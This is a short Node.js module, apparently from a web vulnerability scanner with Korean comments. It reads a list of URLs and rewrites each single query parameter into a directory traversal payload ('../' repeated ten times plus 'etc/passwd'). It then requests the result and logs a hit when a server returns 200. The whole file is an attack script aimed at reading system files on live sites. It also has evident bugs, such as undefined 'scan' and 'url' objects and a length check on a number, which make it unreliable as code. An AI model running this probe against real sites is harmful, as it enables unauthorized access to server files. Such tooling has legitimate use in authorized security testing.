const fs = require('fs');
const http = require('http');

async function path_scan(){

    const regexp = /=/g;
    const payload = "../";

    const site_tree = fs.readFileSync('site_tree.txt').toString().split("\n");

    console.log('1');

    for(let i in site_tree){
    const match1 = site_tree[i].indexOf("?");
    const match2 = site_tree[i].indexOf("=");
    const match3 = site_tree[i].match(regexp);
    const match4 = site_tree[i].indexOf("&");

    // console.log(match3);

    if(match1 !== -1 && match2.length !== -1 && match3.length < 2 && match4 == -1){
        scan_payload = payload.repeat(10) + "etc/passwd"
        // console.log(scan_payload);
        // console.log('2')
        let victim_url = site_tree[i].substr(0, match2 + 1) + scan_payload;

        console.log(victim_url);

        const response = await new Promise(resolve => {
            http.request(victim_url, resolve).end();
        });
        const status = response.statusCode;

        if (status === 200) {
        
            scan.create({
            scanType: "Path traversal",
            scanURL: url,
            scanPayload: scan_payload
            });

            console.log(victim_url);
            console.log("-------------------------------------------------------------------------------");
            break;
        }
        console.log(victim_url);
        console.log("-------------------------------------------------------------------------------");
    }
    // else if(match1 !== -1 && match2.length !== -1 && match3.length > 1 && match4 !== -1){

    //   scan_payload = payload.repeat(10) + "etc/passwd"

    //   while ((match = regexp.exec(site_tree[i])) !== null) {
    //     position = match.index;
    //   }
    //   console.log(position);

    //   //위치 계산해서 payload 합치면됨

    //   // console.log(victim_url);

    // }
    else{
        console.log('query가 발견되지 않았습니다.');
    }
    }
}

module.exports = path_scan;